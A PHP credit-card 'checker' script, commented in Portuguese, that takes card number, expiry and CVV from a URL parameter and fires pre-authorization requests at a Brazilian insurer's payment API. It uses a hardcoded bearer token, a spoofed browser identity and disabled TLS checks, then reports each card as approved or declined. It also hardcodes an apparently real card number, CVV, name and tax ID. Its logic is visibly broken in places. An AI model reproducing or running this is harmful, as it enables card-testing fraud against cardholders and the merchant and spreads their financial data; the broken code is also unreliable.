<?php

extract($_GET);
error_reporting(0);
if (file_exists(getcwd().('/cookie.txt'))) { 
    @unlink('cookie.txt'); 
}
function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];
 
if ($mes < 10){

$mes = multiexplode(array(":", "|", "0"), $mes)[1];

}

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
      

      $ch = curl_init();
  curl_setopt($ch, CURLOPT_URL, "https://api.mongeralaegon.com.br/api.cartaocredito/api/v1/PreAutorizacao");
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_ENCODING, "gzip"); //QUEBRAR CRIPTOGRAFIA
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
  curl_setopt($ch, CURLOPT_USERAGENT, 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36');
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Accept: application/json, text/plain, */*',
'Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6IkE2QTMyMzc1OEY4Qzg1QzE1MTlBQzQxMDUyRDkxQTFEQTVFQjE5QzAiLCJ0eXAiOiJKV1QiLCJ4NXQiOiJwcU1qZFktTWhjRlJtc1FRVXRrYUhhWHJHY0EifQ.eyJuYmYiOjE2MjY3NDQzMDEsImV4cCI6MTYyNjgzMDcwMSwiaXNzIjoiaHR0cHM6Ly9pZGVudGlkYWRlLm1vbmdlcmFsYWVnb24uY29tLmJyIiwiYXVkIjpbImh0dHBzOi8vaWRlbnRpZGFkZS5tb25nZXJhbGFlZ29uLmNvbS5ici9yZXNvdXJjZXMiLCJiYjU4ZDZlYS1lMzAxLTRlMDYtYTQ4ZS0wNzBmNjY0MjczZmUiLCJkZmUzMzRkNy0yZDUzLTQ2ZmMtYmQzZi0zNzc4MWJiNGZmZWIiXSwiY2xpZW50X2lkIjoiV2lkZ2V0Q2FydGFvQ0MiLCJqdGkiOiJocEF2VGd4ZVZyY25VMV93RkczWTFRIiwic2NvcGUiOlsiY2FydGFvY3JlZGl0byIsImZhdHVyYW1lbnRvIl19.WFHxKiG5opSstcmSjRxYLmSOrqoOV2H0fUTu8P6HG1WJ8_GsvK7jvrsPYzlnuLCg_D-kPO4Yl0ot4LzUUfj_Ps1uVOVG1IXOyhyAgyfCQvNewBN0fTPzXDA3qXvQSExiCWxa_df3U3d9SefCkTcqsXJdfwnvuYvk0OXaKt3j-5vkApZ93uBb95Z4-L-5G3GVn-bMQnfXZcTEZ4xMPVaMXb9q9-V3a1KzLwbiDDnA35kocy4sx9BwaJMA15oY7tISYrEDaMtH0Z5HlLBjS3cSfR9wV8uGhuFgsbXf-xVq6mWzRQP08cwrt457yNZmX0cxsQ3cIFdPRYPu29Z0LkdoWA',
'Connection: keep-alive',
'Content-Type: application/json',
'Host: api.mongeralaegon.com.br',
'Origin: https://widgets.mongeralaegon.com.br',
'Referer: https://widgets.mongeralaegon.com.br/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: same-site',
'Sec-GPC: 1',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'));
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, '{"Valor":"5","CartaoCredito":{"NomeConformeCartao":"fabio andrade souza","Bandeira":"Master","NumeroCartao":"4174010107544398","CodigoSeguranca":"823","MesValidade":"06","AnoValidade":"2026"},"Empresa":{"Cnpj":"33608308000173"},"MetadadosDaOperacao":[{"Chave":"cpf","Valor":"16688467801"},{"Chave":"ModeloProposta","Valor":"BZ6"}]}');
      echo $r2 = curl_exec($ch);



//{ "Valor": { "Mensagens": [ "Operação com status 'Autorizada'." ], "CodigoPreAutorizacao": "341127", "Sucesso": true }, "Mensagens": [], "HouveErrosDuranteProcessamento": false, "CondicaoFalha": 0 } #Aprovada » ||| | Pagamento Autorizado
//{ "Valor": { "Mensagens": [ "Operação com status 'NaoAutorizada'." ], "CodigoPreAutorizacao": "341121", "Sucesso": false }, "Mensagens": [], "HouveErrosDuranteProcessamento": false, "CondicaoFalha": 0 } #Reprovada » ||| | Pagamento Não Autorizado
    

    if (strpos($r2, 'NOT_AUTHORIZED')) {
              echo "<span class='badge badge-success'>#Aprovada »</span> <font color='black'>  ".$email."|".$senha." Retorno: <span class='badge badge-success'>logado com sucesso</font></span><BR>";
    flush();
    ob_flush();
  }else{
    echo "<span class='badge badge-danger'> #Reprovada » </span> <font color='black'>".$cc."|".$mes."|".$ano."|".$cvv." | <span class='badge badge-danger'>".$msg."</span> <br /></font>  ";
    flush();
    ob_flush();
}
?>